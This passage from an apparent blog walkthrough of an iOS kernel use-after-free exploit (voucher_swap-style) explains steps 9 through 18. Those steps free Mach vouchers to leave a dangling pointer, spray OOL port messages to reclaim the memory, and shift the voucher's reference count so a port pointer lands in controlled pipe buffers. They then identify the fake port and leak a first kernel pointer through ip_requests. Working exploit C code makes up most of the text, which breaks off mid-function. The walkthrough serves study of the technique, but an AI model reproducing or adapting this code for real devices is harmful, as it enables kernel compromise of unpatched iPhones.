<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="o">/</span> <span class="mi">9</span><span class="err">\</span><span class="p">.</span> <span class="n">Free</span> <span class="n">the</span> <span class="n">first</span> <span class="n">GC</span> <span class="n">spray</span><span class="p">.</span> <span class="n">This</span> <span class="n">makes</span> <span class="n">that</span> <span class="n">memory</span> <span class="n">available</span> <span class="k">for</span> <span class="n">zone</span> <span class="n">garbage</span> <span class="n">collection</span>
    	<span class="c1">// in the loop below.</span>
    	<span class="n">destroy_ports</span><span class="p">(</span><span class="n">gc_ports</span><span class="p">,</span> <span class="n">gc_port_count</span><span class="p">);</span></code></pre></figure>

<h4 id="step-10-release-the-vouchers-created-earlier-thereby-leaving-a-dangling-port">Step 10: Release the Vouchers created earlier thereby leaving a dangling port</h4>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 10\. Free the vouchers we created earlier. This leaves a voucher pointer dangling in our</span>
    	<span class="c1">// thread's ith_voucher field. The voucher ports we created earlier are all now invalid.</span>
    	<span class="c1">//</span>
    	<span class="c1">// The voucher objects themselves have all been overwritten with 0xdeadbeefdeadbeef. If we</span>
    	<span class="c1">// call thread_get_mach_voucher() here, we'll get an "os_refcnt: overflow" panic, and if we</span>
    	<span class="c1">// call thread_set_mach_voucher() to clear it, we'll get an "a freed zone element has been</span>
    	<span class="c1">// modified in zone ipc vouchers" panic.</span>
    	<span class="n">voucher_spray_free</span><span class="p">(</span><span class="n">voucher_ports</span><span class="p">,</span> <span class="n">voucher_spray_count</span><span class="p">);</span></code></pre></figure>

<h4 id="step-11-release-the-vouchers-to-overlap-with-the-port-pointers">Step 11: Release the Vouchers to overlap with the port pointers</h4>

<p>If you remember from Step 6, we used 500 (<strong>gc_port_count</strong>) of the <strong>2000</strong> ports that we had bumped the queue limit to already for spraying. So now we will spray the other ports until we hit the total spray size as <strong>17%</strong> of our platform size. The <strong>ool_holding_ports</strong> pointer is taken from index 500 (<strong>gc_port_count</strong>) onwards since we already used the first <strong>500</strong> for spraying. The idea is to also keep allocation size as <strong>32768</strong> so that it lands in the <strong>kalloc.32768</strong> zone, this is done by keeping the number of port pointers for each message (<strong>ool_port_count = ool_port_spray_kalloc_zone / sizeof(uint64_t</strong>), where <strong>ool_port_spray_kalloc_zone = 32768</strong>), and hopefully after this the memory freed earlier from the vouchers will be reallocated here.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 11\. Reallocate the freed voucher with the OOL port pattern created earlier in the</span>
    	<span class="c1">// kalloc.32768 zone. We need to do this slowly in order to force a zone garbage</span>
    	<span class="c1">// collection. Spraying 17% of memory (450 MB on the iPhone XR) with OOL ports should be</span>
    	<span class="c1">// plenty.</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">ool_ports_spray_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">.</span><span class="mi">17</span> <span class="o">*</span> <span class="n">platform</span><span class="p">.</span><span class="n">memory_size</span><span class="p">;</span>
    	<span class="n">mach_port_t</span> <span class="o">*</span><span class="n">ool_holding_ports</span> <span class="o">=</span> <span class="n">gc_ports</span> <span class="o">+</span> <span class="n">gc_port_count</span><span class="p">;</span>
    	<span class="kt">size_t</span> <span class="n">ool_holding_port_count</span> <span class="o">=</span> <span class="mi">500</span><span class="p">;</span>	<span class="c1">// Use at most 500 ports for the spray.</span>
    	<span class="n">sprayed_size</span> <span class="o">=</span> <span class="n">ool_ports_spray_size_with_gc</span><span class="p">(</span><span class="n">ool_holding_ports</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ool_holding_port_count</span><span class="p">,</span>
    			<span class="n">message_size_for_kalloc_size</span><span class="p">(</span><span class="mi">512</span><span class="p">),</span>
    			<span class="n">ool_ports</span><span class="p">,</span> <span class="n">ool_port_count</span><span class="p">,</span> <span class="n">MACH_MSG_TYPE_MAKE_SEND</span><span class="p">,</span>
    			<span class="n">ool_ports_spray_size</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"sprayed %zu bytes of OOL ports to %zu ports in kalloc.%zu"</span><span class="p">,</span>
    			<span class="n">sprayed_size</span><span class="p">,</span> <span class="n">ool_holding_port_count</span><span class="p">,</span> <span class="n">ool_port_spray_kalloc_zone</span><span class="p">);</span>
    	<span class="n">free</span><span class="p">(</span><span class="n">ool_ports</span><span class="p">);</span></code></pre></figure>

<p>If you look under the method <strong>ool_ports_spray_size_with_gc</strong>, there is also delay added between every <strong>2MB</strong> (<strong>gc_step</strong>) of spray with <strong>usleep()</strong> to give time for zone garbage collection.</p>

<p>Each of these ports are sprayed using mach messages with OOL port descriptors. This will allocate kernel memory and fill them with port pointers. The following code in <strong>ool_ports_spray_port</strong> is used to allocate parameters and send the message.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// Populate the message. Each OOL ports descriptor will be a kalloc.</span>
    	<span class="n">msg</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_bits</span>           <span class="o">=</span> <span class="n">MACH_MSGH_BITS_SET</span><span class="p">(</span><span class="n">MACH_MSG_TYPE_MAKE_SEND</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MACH_MSGH_BITS_COMPLEX</span><span class="p">);</span>
    	<span class="n">msg</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_remote_port</span>    <span class="o">=</span> <span class="n">holding_port</span><span class="p">;</span>
    	<span class="n">msg</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_size</span>           <span class="o">=</span> <span class="p">(</span><span class="n">mach_msg_size_t</span><span class="p">)</span> <span class="n">message_size</span><span class="p">;</span>
    	<span class="n">msg</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_id</span>             <span class="o">=</span> <span class="err">'</span><span class="n">ools</span><span class="err">'</span><span class="p">;</span>
    	<span class="n">msg</span><span class="o">-&gt;</span><span class="n">body</span><span class="p">.</span><span class="n">msgh_descriptor_count</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_msg_size_t</span><span class="p">)</span> <span class="n">ool_count</span><span class="p">;</span>
    	<span class="n">mach_msg_ool_ports_descriptor_t</span> <span class="n">ool_descriptor</span> <span class="o">=</span> <span class="p">{};</span>
    	<span class="n">ool_descriptor</span><span class="p">.</span><span class="n">type</span>             <span class="o">=</span> <span class="n">MACH_MSG_OOL_PORTS_DESCRIPTOR</span><span class="p">;</span>
    	<span class="n">ool_descriptor</span><span class="p">.</span><span class="n">address</span>          <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">ool_ports</span><span class="p">;</span>
    	<span class="n">ool_descriptor</span><span class="p">.</span><span class="n">count</span>            <span class="o">=</span> <span class="p">(</span><span class="n">mach_msg_size_t</span><span class="p">)</span> <span class="n">port_count</span><span class="p">;</span>
    	<span class="n">ool_descriptor</span><span class="p">.</span><span class="n">deallocate</span>       <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
    	<span class="n">ool_descriptor</span><span class="p">.</span><span class="n">copy</span>             <span class="o">=</span> <span class="n">MACH_MSG_PHYSICAL_COPY</span><span class="p">;</span>
    	<span class="n">ool_descriptor</span><span class="p">.</span><span class="n">disposition</span>      <span class="o">=</span> <span class="n">ool_disposition</span><span class="p">;</span>
    	<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ool_count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">msg</span><span class="o">-&gt;</span><span class="n">ool_ports</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">ool_descriptor</span><span class="p">;</span>
    	<span class="p">}</span>
    	<span class="c1">// Send the messages.</span>
    	<span class="kt">size_t</span> <span class="n">messages_sent</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    	<span class="k">for</span> <span class="p">(;</span> <span class="n">messages_sent</span> <span class="o">&lt;</span> <span class="n">message_count</span><span class="p">;</span> <span class="n">messages_sent</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">mach_msg</span><span class="p">(</span>
    				<span class="o">&amp;</span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">,</span>
    				<span class="n">MACH_SEND_MSG</span> <span class="o">|</span> <span class="n">MACH_MSG_OPTION_NONE</span><span class="p">,</span>
    				<span class="p">(</span><span class="n">mach_msg_size_t</span><span class="p">)</span> <span class="n">message_size</span><span class="p">,</span>
    				<span class="mi">0</span><span class="p">,</span>
    				<span class="n">MACH_PORT_NULL</span><span class="p">,</span>
    				<span class="n">MACH_MSG_TIMEOUT_NONE</span><span class="p">,</span>
    				<span class="n">MACH_PORT_NULL</span><span class="p">);</span>
    		<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    			<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"mach_msg"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    			<span class="k">break</span><span class="p">;</span>
    		<span class="p">}</span>
    	<span class="p">}</span></code></pre></figure>

<h4 id="step-12-call-thread_get_mach_voucher-to-get-a-voucher-port-for-the-freed-voucher">Step 12: Call thread_get_mach_voucher() to get a voucher port for the freed voucher</h4>

<p>Using <strong>thread_get_mach_voucher</strong>, we can recover the voucher port for the freed voucher, and this will allow us to further manipulate the reference count of the voucher.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    	<span class="c1">// 12\. Once we've reallocated the voucher with an OOL ports allocation, the iv_refs field</span>
    	<span class="c1">// will overlap with the lower 32 bits of the pointer to base_port. If base_port's address</span>
    	<span class="c1">// is low enough, this tricks the kernel into thinking that the reference count is valid,</span>
    	<span class="c1">// allowing us to call thread_get_mach_voucher() without panicking. And since the OOL ports</span>
    	<span class="c1">// pattern overwrote the voucher's iv_port field with MACH_PORT_NULL,</span>
    	<span class="c1">// convert_voucher_to_port() will go ahead and allocate a fresh voucher port through which</span>
    	<span class="c1">// we can manipulate our freed voucher while it still overlaps our OOL ports.</span>
    	<span class="n">kr</span> <span class="o">=</span> <span class="n">thread_get_mach_voucher</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uaf_voucher_port</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"c"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not get a voucher port to the freed voucher; reallocation failed?"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">MACH_PORT_VALID</span><span class="p">(</span><span class="n">uaf_voucher_port</span><span class="p">))</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"freed voucher port 0x%x is not valid"</span><span class="p">,</span> <span class="n">uaf_voucher_port</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"recovered voucher port 0x%x for freed voucher"</span><span class="p">,</span> <span class="n">uaf_voucher_port</span><span class="p">);</span></code></pre></figure>

<h4 id="step-13-modify-the-iv_refs-to-point-to-pipe-buffers">Step 13: Modify the iv_refs to point to pipe buffers</h4>

<p>Using the voucher port, we can modify the <strong>iv_refs</strong> value using the same vulnerability (reference leak this time) and hope that it points to our pipe buffers. If you recall from before, the <strong>iv_refs</strong> was actually pointing to the base port. So now the <strong>iv_refs</strong> pointer is incremented by <strong>4MB</strong> (<strong>base_port_to_fake_port_offset</strong>) in this case, and if you remember we sprayed about <strong>16MB</strong> of Pipe buffers, so the Port pointer should overlap somewhere within our sprayed Pipe buffers.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 13\. Alright, we've pushed through the first risky part! We now have a voucher port that</span>
    	<span class="c1">// refers to a voucher that overlaps with our OOL ports spray. Our next step is to modify</span>
    	<span class="c1">// the voucher's iv_refs field using the reference counting bugs so that the ipc_port</span>
    	<span class="c1">// pointer it overlaps with now points into our pipe buffers. That way, when we receive the</span>
    	<span class="c1">// message, we'll get a send right to a fake IPC port object whose contents we control.</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"adding references to the freed voucher to change the OOL port pointer"</span><span class="p">);</span>
    	<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">base_port_to_fake_port_offset</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">voucher_reference</span><span class="p">(</span><span class="n">uaf_voucher_port</span><span class="p">);</span>
    	<span class="p">}</span>
    	<span class="n">kr</span> <span class="o">=</span> <span class="n">thread_set_mach_voucher</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="n">MACH_PORT_NULL</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not clear thread voucher"</span><span class="p">);</span>
    		<span class="c1">// This is a horrible fix, since ith_voucher still points to the freed voucher, but</span>
    		<span class="c1">// at least it'll make the OOL port pointer correct so the exploit can continue.</span>
    		<span class="n">voucher_release</span><span class="p">(</span><span class="n">uaf_voucher_port</span><span class="p">);</span>
    	<span class="p">}</span></code></pre></figure>

<h4 id="step-14-identify-voucher-port-and-overlapping-fake-port">Step 14: Identify Voucher Port and overlapping fake port</h4>

<p>Now since the freed voucher (which is actually overlapped with port pointers) has an <strong>iv_refs</strong> pointer pointing to somewhere within the pipe buffers, we need to find out which of the <strong>1024</strong> pipe buffers is it. In order to do that, we receive the messages that we sent earlier using <strong>OOL</strong> Ports descriptor. We loop through all the descriptors in the message and pass them to a handler block with the parameter as the starting ports address and the total number of ports. Then we loop through each of these port pointers as vouchers using a helper function <strong>iterate_ipc_vouchers_via_mach_ports</strong> that gives out address of all possible vouchers by dividing the size of all port pointers by voucher size. The <strong>ool_voucher_port</strong> can be identified because it will have a valid voucher port, since we called <strong>thread_get_mach_voucher()</strong> only on that voucher, and also by checking against <strong>uaf_voucher_port</strong> at an offset of <strong>7</strong> when looping as port pointers, since its <strong>7*8</strong> which is 56 bytes (offset of <strong>iv_port</strong>) in the voucher struct. The fake port is identified simply as the value pointing to the <strong>iv_refs</strong> which is at an offset of <strong>0x8</strong> and hence index <strong>1</strong> when using port pointers.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 14\. Now receive the OOL ports and recover our voucher port and the fake port that</span>
    	<span class="c1">// overlaps our pipe buffers. This is where we're most likely to panic if the port/pipe</span>
    	<span class="c1">// groom failed and the overlapping OOL port pointer does not point into our pipe buffers.</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"receiving the OOL ports will leak port 0x%x"</span><span class="p">,</span> <span class="n">base_port</span><span class="p">);</span>
    	<span class="n">fake_port</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    	<span class="n">ool_ports_spray_receive</span><span class="p">(</span><span class="n">ool_holding_ports</span><span class="p">,</span> <span class="n">ool_holding_port_count</span><span class="p">,</span>
    			<span class="o">^</span><span class="p">(</span><span class="n">mach_port_t</span> <span class="o">*</span><span class="n">ool_ports</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">)</span> <span class="p">{</span>
    		<span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">!=</span> <span class="n">ool_port_count</span><span class="p">)</span> <span class="p">{</span>
    			<span class="n">ERROR</span><span class="p">(</span><span class="s">"unexpected OOL ports count %zu"</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
    			<span class="k">return</span><span class="p">;</span>
    		<span class="p">}</span>
    		<span class="c1">// Loop through each of the possible voucher positions in the OOL ports looking for</span>
    		<span class="c1">// a sign that this is where the voucher overlaps.</span>
    		<span class="n">iterate_ipc_vouchers_via_mach_ports</span><span class="p">(</span><span class="n">count</span><span class="p">,</span> <span class="o">^</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">voucher_start</span><span class="p">)</span> <span class="p">{</span>
    			<span class="c1">// We're checking to see whether index 7 (which was MACH_PORT_NULL when we</span>
    			<span class="c1">// sent the message) now contains a port. If it does, that means that this</span>
    			<span class="c1">// segment of the OOL ports overlapped with the freed voucher, and so when</span>
    			<span class="c1">// we called thread_get_mach_voucher() above, the iv_port field was set to</span>
    			<span class="c1">// the newly allocated voucher port (which is what we're receiving now).</span>
    			<span class="n">mach_port_t</span> <span class="n">ool_voucher_port</span> <span class="o">=</span> <span class="n">ool_ports</span><span class="p">[</span><span class="n">voucher_start</span> <span class="o">+</span> <span class="mi">7</span><span class="p">];</span>
    			<span class="k">if</span> <span class="p">(</span><span class="n">ool_voucher_port</span> <span class="o">!=</span> <span class="n">MACH_PORT_NULL</span><span class="p">)</span> <span class="p">{</span>
    				<span class="n">INFO</span><span class="p">(</span><span class="s">"received voucher port 0x%x in OOL ports"</span><span class="p">,</span> <span class="n">ool_voucher_port</span><span class="p">);</span>
    				<span class="n">INFO</span><span class="p">(</span><span class="s">"voucher overlapped at offset 0x%zx"</span><span class="p">,</span>
    						<span class="n">voucher_start</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">));</span>
    				<span class="k">if</span> <span class="p">(</span><span class="n">ool_voucher_port</span> <span class="o">!=</span> <span class="n">uaf_voucher_port</span><span class="p">)</span> <span class="p">{</span>
    					<span class="n">ERROR</span><span class="p">(</span><span class="s">"voucher port mismatch"</span><span class="p">);</span>
    				<span class="p">}</span>
    				<span class="k">if</span> <span class="p">(</span><span class="n">fake_port</span> <span class="o">!=</span> <span class="n">MACH_PORT_NULL</span><span class="p">)</span> <span class="p">{</span>
    					<span class="n">ERROR</span><span class="p">(</span><span class="s">"multiple fake ports"</span><span class="p">);</span>
    				<span class="p">}</span>
    				<span class="n">fake_port</span> <span class="o">=</span> <span class="n">ool_ports</span><span class="p">[</span><span class="n">voucher_start</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
    				<span class="n">ool_ports</span><span class="p">[</span><span class="n">voucher_start</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    				<span class="n">INFO</span><span class="p">(</span><span class="s">"received fake port 0x%x"</span><span class="p">,</span> <span class="n">fake_port</span><span class="p">);</span>
    			<span class="p">}</span>
    		<span class="p">});</span>
    	<span class="p">});</span>
    	<span class="c1">// Make sure we got a fake port.</span>
    	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">MACH_PORT_VALID</span><span class="p">(</span><span class="n">fake_port</span><span class="p">))</span> <span class="p">{</span>
    		<span class="k">if</span> <span class="p">(</span><span class="n">fake_port</span> <span class="o">==</span> <span class="n">MACH_PORT_NULL</span><span class="p">)</span> <span class="p">{</span>
    			<span class="n">ERROR</span><span class="p">(</span><span class="s">"did not receive a fake port in OOL ports spray"</span><span class="p">);</span>
    		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    			<span class="n">ERROR</span><span class="p">(</span><span class="s">"received an invalid fake port in OOL ports spray"</span><span class="p">);</span>
    		<span class="p">}</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span></code></pre></figure>

<h4 id="step-15-find-overlapping-pipefds">Step 15: Find overlapping pipefds</h4>

<p>Next, we need to identify that out of the all the pipe buffers that we created, which one overlaps with the fake port. To do that, we use the API <strong>mach_port_kobject</strong> to get the <strong>IKOT_TYPE</strong> value of the <strong>fake_port</strong> and this value should be the index of the pipe, because if you remember, in Step 4, we were creating ports within the pipe buffers and for each port that we created, we were overalapping the <strong>IKOT_TYPE</strong> with the index of the pipe buffer. Using this, we can identify which <strong>pipefds</strong> our fake port is overlapping with.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 15\. Check which pair of pipefds overlaps our port using mach_port_kobject(). The</span>
    	<span class="c1">// returned type value will be the lower 12 bits of the ipc_port's ip_bits field, which</span>
    	<span class="c1">// we've set to the index of the pipe overlapping the port during our spray.</span>
    	<span class="c1">//</span>
    	<span class="c1">// This is the third and final risky part: we could panic if our fake port doesn't actually</span>
    	<span class="c1">// point into our pipe buffers. After this, though, it's all smooth sailing.</span>
    	<span class="n">natural_t</span> <span class="n">type</span><span class="p">;</span>
    	<span class="n">mach_vm_address_t</span> <span class="n">addr</span><span class="p">;</span>
    	<span class="n">kr</span> <span class="o">=</span> <span class="n">mach_port_kobject</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">fake_port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">type</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"mach_port_kobject"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not determine the pipe index of our port"</span><span class="p">);</span>
    	<span class="p">}</span>
    	<span class="kt">size_t</span> <span class="n">pipe_index</span> <span class="o">=</span> <span class="n">type</span><span class="p">;</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"port is at pipe index %zu"</span><span class="p">,</span> <span class="n">pipe_index</span><span class="p">);</span>
    	<span class="c1">// Get the pipefds that allow us to control the port.</span>
    	<span class="kt">int</span> <span class="o">*</span><span class="n">port_pipefds</span> <span class="o">=</span> <span class="n">pipefds_array</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">pipe_index</span><span class="p">;</span>
    	<span class="n">pipefds</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">port_pipefds</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    	<span class="n">pipefds</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">port_pipefds</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    	<span class="n">port_pipefds</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    	<span class="n">port_pipefds</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span></code></pre></figure>

<h4 id="step-16-clean-up-the-unused-memory">Step 16: Clean up the unused memory</h4>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 16\. Clean up unneeded resources: terminate the ith_voucher thread, discard the filler</span>
    	<span class="c1">// ports, and close the sprayed pipes.</span>
    	<span class="n">thread_terminate</span><span class="p">(</span><span class="kr">thread</span><span class="p">);</span>
    	<span class="n">destroy_ports</span><span class="p">(</span><span class="n">filler_ports</span><span class="p">,</span> <span class="n">filler_port_count</span><span class="p">);</span>
    	<span class="n">free</span><span class="p">(</span><span class="n">filler_ports</span><span class="p">);</span>
    	<span class="n">close_pipes</span><span class="p">(</span><span class="n">pipefds_array</span><span class="p">,</span> <span class="n">pipe_count</span><span class="p">);</span>
    	<span class="n">free</span><span class="p">(</span><span class="n">pipefds_array</span><span class="p">);</span></code></pre></figure>

<h4 id="step-17-set-up-primitive-to-find-the-address-of-the-base-port">Step 17: Set up primitive to find the address of the base port</h4>

<p>We have a fake port overlapping with the content of the pipe buffer, that we can read and write into since we know which pipe buffer is it. Now our task is to create a <strong>fake port</strong> such that we can use the <strong>pid_for_task()</strong> technique with it to read 4 bytes of kernel memory at a time. This technique was discussed in the Part 1 of this article.</p>

<p><img src="/images/pid.png" alt="Pid" /></p>

<p>But what this also means is that our fake task’s <strong>kobject</strong> field should point to a task struct that we control, so that we can have a look at the <strong>bsd_info</strong> field of the task that points to a <strong>proc</strong> struct. Ideally, the fake port along with the fake task should both be in the pipe buffers, so we can read and write into them. In order to find that out, we send the mach api call <strong>mach_port_request_notification()</strong> to the fake port to add a request that if the fake port becomes a dead name (<strong>MACH_PORT_DEAD</strong>), the base port will be notified. This causes our fake port’s <strong>ip_requests</strong> field to point to an array that contains a pointer to the <strong>base_port</strong> address.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 17\. Use mach_port_request_notification() to put a pointer to an array containing</span>
    	<span class="c1">// base_port in our port's ip_requests field.</span>
    	<span class="n">mach_port_t</span> <span class="n">prev_notify</span><span class="p">;</span>
    	<span class="n">kr</span> <span class="o">=</span> <span class="n">mach_port_request_notification</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">fake_port</span><span class="p">,</span>
    			<span class="n">MACH_NOTIFY_DEAD_NAME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    			<span class="n">base_port</span><span class="p">,</span> <span class="n">MACH_MSG_TYPE_MAKE_SEND_ONCE</span><span class="p">,</span>
    			<span class="o">&amp;</span><span class="n">prev_notify</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"mach_port_request_notification"</span><span class="p">,</span>
    				<span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not request a notification for the fake port"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">prev_notify</span> <span class="o">==</span> <span class="n">MACH_PORT_NULL</span><span class="p">);</span></code></pre></figure>

<h4 id="step-18-find-the-address-of-the-base-port">Step 18: Find the address of the base port</h4>

<p>We read from the overlapping pipe buffer and iterate though the whole buffer as ports, look at each possible port’s <strong>ip_requests</strong> field, and if we find that field, we know that it contains the address of an array that contains a pointer to <strong>base_port</strong>, because this is the only port we have set a notification for. Note that we still can’t read that address yet. We save the offset of that fake port within the pipe buffer. Then we write to the pipe so the data from the pipe can now be read later on. We now know exactly at what offset the fake port lies in the pipe buffer and within which pipe buffer it lies (we already found that out before). We also know the address of <strong>ip_requests</strong> so we need a way to read from that address.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 18\. Now read back our pipe buffer to discover the value of ip_requests (and get our</span>
    	<span class="c1">// first kernel pointer!). This also tells us where our port is located inside the pipe</span>
    	<span class="c1">// buffer.</span>
    	<span class="n">read_pipe</span><span class="p">();</span>
    	<span class="n">__block</span> <span class="kt">uint64_t</span> <span class="n">ip_requests</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    	<span class="n">iterate_ipc_ports</span><span class="p">(</span><span class="n">pipe_buffer_size</span><span class="p">,</span> <span class="o">^</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">port_offset</span><span class="p">,</span> <span class="n">bool</span> <span class="o">*</span><span class="n">stop</span><span class="p">)</span> <span class="p">{</span>
    		<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">port</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">pipe_buffer</span> <span class="o">+</span> <span class="n">port_offset</span><span class="p">;</span>
    		<span class="kt">uint64_t</span> <span class="o">*</span><span class="n">port_ip_requests</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">port</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_requests</span><span class="p">));</span>
    		<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">port_ip_requests</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    			<span class="c1">// We've found the overlapping port. Record the offset of the fake port,</span>
    			<span class="c1">// save the ip_requests array, and set the field in the port to NULL.</span>
    			<span class="n">assert</span><span class="p">(</span><span class="n">ip_requests</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
